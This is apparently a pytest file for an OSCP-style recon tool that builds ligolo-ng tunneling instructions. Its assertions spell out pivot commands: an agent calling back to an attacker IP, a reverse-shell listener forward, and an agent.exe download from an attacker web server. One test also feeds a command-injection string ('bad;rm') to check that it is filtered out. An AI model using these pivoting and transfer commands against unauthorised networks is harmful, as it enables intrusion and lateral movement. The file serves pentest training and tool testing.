from oscprecon.ligolo import build_ligolo_steps, detect_tun_ip


def test_build_steps_interpolates_values() -> None:
    steps = build_ligolo_steps("10.10.14.27", port=11601, iface="ligolo", routes=["172.16.1.0/24"])
    flat = "\n".join(c for s in steps for c in s.commands)
    assert "./proxy -selfcert -laddr 0.0.0.0:11601" in flat
    assert "./agent -connect 10.10.14.27:11601 -ignore-cert" in flat  # Linux agent dials back
    assert "interface_create --name ligolo" in flat
    assert "interface_add_route --name ligolo --route 172.16.1.0/24" in flat
    assert "tunnel_start --tun ligolo" in flat
    # the last step points the user at Nabu's scan feature with the real /24
    assert any("Scan a host / range" in c and "172.16.1.0/24" in c for c in steps[-1].commands)


def test_build_steps_multiple_routes_and_filters_junk() -> None:
    steps = build_ligolo_steps("10.0.0.1", routes=["172.16.1.0/24", "bad;rm", "10.10.5.0/24", ""])
    console = next(s for s in steps if s.where == "ligolo console")
    routes = [c for c in console.commands if "interface_add_route" in c]
    assert len(routes) == 2  # only the two valid CIDRs; "bad;rm" and "" dropped
    assert all(";" not in c for c in routes)  # no shell metachar ever reaches a command


def test_build_steps_placeholder_when_no_route() -> None:
    steps = build_ligolo_steps("10.0.0.1", routes=[])
    flat = "\n".join(c for s in steps for c in s.commands)
    assert "<internal_/24>" in flat  # a clear placeholder, and no bogus manual-route step
    assert not any(s.title.startswith("If traffic") for s in steps)


def test_detect_tun_ip_returns_empty_for_unknown_iface() -> None:
    assert detect_tun_ip("definitely-no-such-iface-xyz") == ""


def test_download_step_matches_agent_os() -> None:
    from oscprecon.ligolo import LIGOLO_DL_VERSION, build_ligolo_steps

    v = LIGOLO_DL_VERSION
    win = "\n".join(
        c for s in build_ligolo_steps("10.0.0.1", agent_os="windows") for c in s.commands
    )
    assert f"ligolo-ng_proxy_{v}_linux_amd64.tar.gz" in win  # proxy is always Linux (runs on Kali)
    assert f"ligolo-ng_agent_{v}_windows_amd64.zip" in win  # agent matches the WINDOWS pivot
    lin = "\n".join(c for s in build_ligolo_steps("10.0.0.1", agent_os="linux") for c in s.commands)
    assert f"ligolo-ng_agent_{v}_linux_amd64.tar.gz" in lin


def test_steps_are_renumbered_sequentially() -> None:
    from oscprecon.ligolo import build_ligolo_steps

    steps = build_ligolo_steps("10.0.0.1", routes=["172.16.1.0/24"])
    assert [s.n for s in steps] == list(range(len(steps)))  # 0..N, no gaps despite optional steps
    assert steps[0].title.startswith("Download")  # the flow starts at downloading off GitHub


def test_reference_sections_cover_serve_transfer_tunnel() -> None:
    from oscprecon.ligolo import ligolo_reference_sections

    secs = {s.title: s for s in ligolo_reference_sections("10.10.14.7", agent_os="windows")}
    titles = " ".join(secs)
    assert "Serve" in titles and "WINDOWS" in titles and "LINUX" in titles
    assert "tunnel" in titles.lower() and "console" in titles.lower() and "Fileless" in titles
    # a Windows pivot lists its transfers before the Linux ones
    order = list(secs)
    assert order.index([t for t in order if "WINDOWS" in t][0]) < order.index(
        [t for t in order if "LINUX" in t][0]
    )
    # the reverse-shell listener + certutil transfer are present with the real IP filled
    flat = "\n".join(i.command for s in secs.values() for i in s.items)
    assert "listener_add --addr 0.0.0.0:9091 --to 127.0.0.1:443" in flat
    assert "http://10.10.14.7:8000/agent.exe" in flat
